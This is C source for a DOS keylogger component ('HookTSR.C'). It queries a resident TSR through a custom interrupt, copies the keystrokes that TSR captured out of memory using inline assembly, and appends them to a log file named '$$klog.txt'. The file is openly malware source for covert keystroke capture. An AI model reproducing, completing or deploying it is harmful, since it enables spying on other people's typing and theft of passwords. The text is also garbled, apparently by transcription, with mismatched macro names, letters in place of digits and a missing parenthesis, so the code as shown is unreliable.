/*+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+ 																			  +
+ HookTSR. C 																  +
+ 																			  +
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++*/
#include<stdio. h>
#include<stdlib. h>
/*[Data Types]--------------------------------------------------------------------------*/
#define WORD unsigned short
#define BYTE unsigned char
/* [Program-Specific Definitions]--------------------------------------------------------*/
#define SZ_BUFFER	513	//maximum size of log file buffer ([e) ... (512))
#define NCOLS	16	//number of columns per row when printing to CRT

#define FILE_NAME ".\\$$klog.txt" 	//name of log file
#define MODE "a" 					//open file in 'append' mode
#define ISR_COOE 0xBB 				//interrupt vector number
#define SZ_CONTROL_CHAR 0x20 		//first 32 ASCII chars (e-31) are "control chars"
#define LAST_ASCII ox7E 			//'-' (alphanumeric range from 32 to 126)
//the following array is used to represent control chars in the log file
const char *CONTROL_CHAR[SZ_CONTROL_CHAR] =
{
"[Null]",
"[Start of Header]",
"[Start of Text]",
"[End of Text]",
"[End of Transmission]" ,
"[Enquiry]",
"[Acknowledgment]" ,
"[Bell]",
"[Backspace]",
"[Horizontal Tab]",
"[Line feed]",
"[Vertical Tab]",
"[Form feed]",
"[Carriage return]",
"[Shift Out]",
"[Shift In]",
"[Data Link Escape]",
"[Device Control 1]",
"[Device Control 2]",
"[Device Control 3]",
"[Device Control 4]",
"[Negative Acknowledgement]",
"[Synchronous Idle]",
"[End of Trans. Block]",
"[Cancel]" ,
"[End of Medium]",
"[Substitute]",
"[Escape]",
"[File Separator]",
"[Group Separator]",
"[Record Separator]",
"[Unit Separator]"
};
/*
This is here for shits-and-giggles (i.e., experimental purposes)
Verify 2 different tactics for obtaining the address of a function
1) First method uses C-based function pointer
2) Second uses inline assembly code
*/
void printProcAddr()
{
	WORD addr;
	void (*fp)();
	fp = &printProcAddr;
	
	_asm
	{
	MOV AX, OFFSET printProcAddr
	MOV addr, AX
	}
	//Both snippets print offset address of function
	printf("proc offset = %X\n",fp);
	printf("proc offset = %X\n",addr);
	return;
}/*end printProcAddr()-----------------------------------------*/
/*
This puts a keystroke into the buffer (which flushes to a file when full)
*/
void putInLogFile(BYTE* bptr,int size)
{
	FILE *fptr;		//pointer to log file
	int retVal;		//used to check for errors
	int i;
	
	//flush buffer to file
	fptr = fopen(FILE_NAME,MODE);
	if(fptr==NULL)
	{
		printf("putInFileBuffer() : cannot open log file\n");
		return;
	}
	for(i=0;i<size;i++)
	{
		if((bptr[ i] >=SZ_CONTROL_CHAR)&&(bptr[i] <= LAST_ASCII))
		{
			retVal = fputc(bptr[i],fptr);
			if( retVal==EOF)
			{
				printf("putlnLogFile(): Error writing %c to log file\n",bptr[i]
			}
		}
		else if(bptr[i]<SZ_CONTROL_CHAR)
		{
			fputs(CONTROL_CHAR[bptr[i]], fptr);
		}
		else
		{
			fprintf(fptr, "[%X]", bptr[i]);
		}
	}
	retVal = fputs("[EOB]\n",fptr);
	if(retVal==EOF)
	{
		printf("putInLogFile() : Error writing to log file \n") ;
	}
	retVal = fclose(fptr) ;
	if(retVal==EOF)
	{
		printf("putInLogFile() : Error closing log file \n");
	}
return;
}/*end putInLogFile()----------------------------------------------------*/

void printBuffer(char* cptr, int size)
{
	int nColumns;		//formats the output to NCOLS columns
	int nPrinted;		//tracks number of alphanumeric bytes
	int i;
	printf( "printBuffer( ):------------------------------\ n");
	nColumns=0;
	nPrinted=0 ;
	for(i=0; i<size; i++)
	{
		if((cptr[i] >=0x20)&&(cptr[i] <=0x7E))
		{
			printf("%c ", cptr[i]);
			nPrinted++;
		}
		else
		{
			printf("*");
		}
		nColumns++;
		if(nColumns==NCOLS)
		{
			printf("\n");
			nColumns=0;
		}
	}
	printf("\nPrinted %d of %d total\n",nPrinted, size);
	return;
}/*end printBuffer()-----------------------------------------*/
/*
This is the driver (as if it weren't obvious)
It reads the global buffer set up by the TSR and sends it to the screen
*/
void emptyBuffer()
{
	WORD bufferCS;			//Segment address of global buffer
	WORD bufferIP;			// offset address of global buffer
	BYTE crtIO[SZ_BUFFER];	// buffer for screen output
	WORD index;				//position in global memory
	WORD value;				//value read from global memory

	//start by getting the address of the global buffer

	_asm
	{
		PUSH DX
		PUSH DI
		INT ISR_CODE
		MOV bufferCS, DX
		MOV bufferIP, DI
		POP DI
		POP DX
	}
	printf( "buffer[CS, IP]=%04X,%04X\n", bufferCS, bufferIP);
	//move through global memory and harvest characters
	for(index=0; index<SZ_BUFFER; index++)
	{
		_asm
		{
			PUSH ES
			PUSH BX
			PUSH SI
			MOV ES, bufferCS
			MOV BX, bufferIP
			MOV SI, index
			ADD BX,SI
		
			PUSH DS
			MOV CX,ES
			MOV DS ,CX
			MOV SI,DS: [BX]
			POP DS
		
			MOV value,SI
		
			POP SI
			POP BX
			POP ES
		}
		crtIO[index]=(char)value;
	}
	// display the harvested chars
	printBuffer(crtIO, SZ_BUFFER);
	putlnLogFile(crtIO, SZ_BUFFER);
	return;
}/*end emptyBuffer()-------------------------------------------------*/
void main()
{
	emptyBuffer();
	return;
}/*end main()-------------------------------------------------------------*/
